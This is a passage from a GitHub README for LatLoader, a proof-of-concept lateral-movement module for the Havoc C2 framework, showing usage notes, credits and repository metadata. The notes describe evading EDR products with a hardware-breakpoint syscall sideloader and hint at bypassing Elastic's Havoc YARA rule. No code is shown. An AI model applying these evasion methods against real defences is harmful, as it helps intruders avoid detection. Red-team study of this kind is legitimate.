- This project is a PoC meant for learning purposes. Never use this in a real world environment. It was not designed for that and you will most definitely get burned unless you heavily modify the tool.
- The default DLL sideloader utilizes the [HWSyscalls](https://github.com/ShorSec/HWSyscalls) project to perform a single `NtAllocateVirtualMemory` call using hardware breakpoints. This is not effective against any EDRs that rely on kernel callbacks for detecting winapi usage (Elastic, MDE, etc). However, I have included it as a PoC to demonstrate how it could be used against other EDRs which still rely on hooking. If you would like to use a version of the sideloader without HWBP syscalls, simply modify the makefile to compile `sideloader.c` instead of `sideloader.cpp`.
- If you are looking to achieve 0 alerts by Elastic when using `sideload`, you must account for Elastic's in memory detection [yara rule](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Havoc.yar) for Havoc. This can be bypassed by modifying the Havoc framework itself with relative ease. I will leave the specifics of this process to the reader. ;)

## Greetz/Credit

[Permalink: Greetz/Credit](https://github.com/icyguider/LatLoader#greetzcredit)

- [@C5spider](https://twitter.com/C5pider), [@s4ntiago\_p](https://twitter.com/s4ntiago_p), and all other contributors to the [Havoc C2 Framework](https://github.com/HavocFramework/Havoc).
- [@Yaxser](https://twitter.com/Yas_o_h) for their [wmiexec BOF](https://github.com/Yaxser/CobaltStrike-BOF/blob/master/WMI%20Lateral%20Movement/WMI-ProcessCreate.cpp) which was lightly modified for use in this project.
- [@dec0ne](https://twitter.com/dec0ne) and [@Idov31](https://twitter.com/Idov31) for [HWSyscalls](https://github.com/ShorSec/HWSyscalls) utilized by the DLL sideloader.
- [Elastic](https://www.elastic.co/) for allowing anyone to test their EDR for free and for making their default rules public.
- [Microsoft's Online Documentation](https://learn.microsoft.com/) for teaching me all about windows programming and internals. They also provide excellent example code that I and others gladly take and adopt for our offensive needs.

## About

PoC module to demonstrate automated lateral movement with the Havoc C2 framework.


### Resources

[Readme](https://github.com/icyguider/LatLoader#readme-ov-file)

### License

[GPL-3.0 license](https://github.com/icyguider/LatLoader#GPL-3.0-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/icyguider/LatLoader).

[Activity](https://github.com/icyguider/LatLoader/activity)

### Stars

[**307**\\
stars](https://github.com/icyguider/LatLoader/stargazers)

### Watchers

[**5**\\
watching](https://github.com/icyguider/LatLoader/watchers)

### Forks

[**35**\\
forks](https://github.com/icyguider/LatLoader/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Ficyguider%2FLatLoader&report=icyguider+%28user%29)

## [Releases](https://github.com/icyguider/LatLoader/releases)

No releases published

## [Packages\  0](https://github.com/users/icyguider/packages?repo_name=LatLoader)

No packages published

## Languages

- [C++60.7%](https://github.com/icyguider/LatLoader/search?l=c%2B%2B)
- [C22.4%](https://github.com/icyguider/LatLoader/search?l=c)
- [Python15.3%](https://github.com/icyguider/LatLoader/search?l=python)
- [Makefile1.6%](https://github.com/icyguider/LatLoader/search?l=makefile)

You can’t perform that action at this time.